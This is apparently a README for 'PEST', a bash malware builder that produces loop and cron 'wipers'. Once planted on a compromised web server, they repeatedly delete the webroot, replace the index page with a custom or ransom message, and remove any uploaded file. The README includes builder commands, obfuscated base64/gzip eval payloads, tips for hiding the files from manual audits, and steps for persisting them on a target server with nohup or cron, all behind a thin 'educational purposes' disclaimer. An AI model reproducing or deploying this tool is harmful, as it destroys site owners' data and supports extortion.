# PEST

This is for **educational purposes** only. I bear no responsibility for what you use this for. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.

This is a fire and forget way to keep a webmaster confused.

Using the build tool, you can generate three different types of bash files that will perform differently.

- Loop wiper : Will consistently wipe the webroot and replace the index.php/index.html with a custom message. Runs in an infinite loop.

- Cron wiper : Same as the **loop**, but runs only once as it is intended to be added as a cron job.

# How it works

A webmaster might get a message on the web root in an `index.php` file. No matter what he/she does, They cannot get rid of that file. It comes back after being deleted and no other file can be uploaded. Any uploaded file gets deleted immediately.

# Usage

To build the final product you need the following

- The webroot path
- A custom message (A ransom message maybe)
- Sleep time in seconds (This will be ignored for cron wiper). This serves as a delay between each run.

Then you get a copy of **pest-builder** either by cloning this repo or just copying and pasting the code.

Make it executable by running

```bash
chmod +x pest-builder
```

To build a **loop wiper**, run:

```bash
./pest-builder loop "/home/user/public_html" "Hacked" 120
```

A file named **".loop_wiper"** will be created. It's contents will look like this

```bash
#!/usr/bin/env bash
eval "$(echo -n 'H4sIAAAAAAAAA5VRXUvDMBR9v7/iLoSxCbPW11JhYlDB2rEO9jBGqckdLaZp7QcK4n832NWtQh/MQ0g45x7OORcUSZ1UhIsKt+J2HYYbnzlpkZPT1lQ5ZfuiMxmnTa6ZB3DGXi+fozCIAxFFy3vhs4dEvpL6Q4qehFjFm8dA+O71lcXg0BrZZIVBqdVsjp+A9uxwggtCxl2Ge5xOsaKmrYx3AtUoOJjbDZmy+/RUxlfbO4YTf1SM8ZmukbvzHs3xwuY4jOLdNMLXWbJENr/JbErkx2I7EZJpgXzYHt6wnuRkRtHHZZmW7D/844KsDYD3NNNkzbq2mzd77z1UBfyIWWte96o1UYn8tCAPVGEIvgGdBZGrEQIAAA==' | base64 -d | gunzip -c)";
```


To build a **cron wiper**, run:

```bash
./pest-builder cron "/home/user/public_html" "Hacked" 120
```

A file named **".cron_wiper"** will be created. It's contents will look like something similar to this  

```bash
#!/usr/bin/env bash
eval "$(echo -n 'H4sIAAAAAAAAA5WRXUvDMBSG7/Mr3h3C2IRZ6+2oMDGoYO1YB7sYUmqS0WL6QdaCIP53A13nKvTC3IXnOSfnPWFKS5NajYXFTtxvomgbkJdVhfbao7Ze3b6bXCZZUxhaMnZhb1avcRQmoYjj1aMI6CmVH1r9keIXIdbJ9jkUgX974xg7tKVs8qqENGo2xxeDO3tMsNAg7hPeMJ3C6qa15fIXqlE4qNsPTdldepX4evdAmASjzYjPzBHcn/e0wJXLcRjlXTXY90WyVDbnZC4l+GmxXRMtswp8uD3cUS95ean053Wd1fQf//RBbgzmnmc/RcAVN9cBAAA=' | base64 -d | gunzip -c)";
```

Yes. It's an encoded malware.

## Obfuscation
It is important you obfuscate these files by changing the file names, making them dot files and adding useless comments at the top of the file to distract during manual audit.

Also note that the cron wiper is discouraged as it raises attention and is quick to spot.

## Using the generated files
To run the loop_wiper, upload the file to the target server and make it executable by running  

```bash
chmod +x .loop_wiper
```

then run the following command on the target server

```bash
nohup ./.loop_wiper & disown
```

To run the .cron_wiper, **add it the the list of cron jobs**. Using the cpanel or **crontab** command.


If you find this page confusing, or you have no idea what's going on, maybe you should not be here at all. Go build a cute website or an app.


Stay Dangerous.
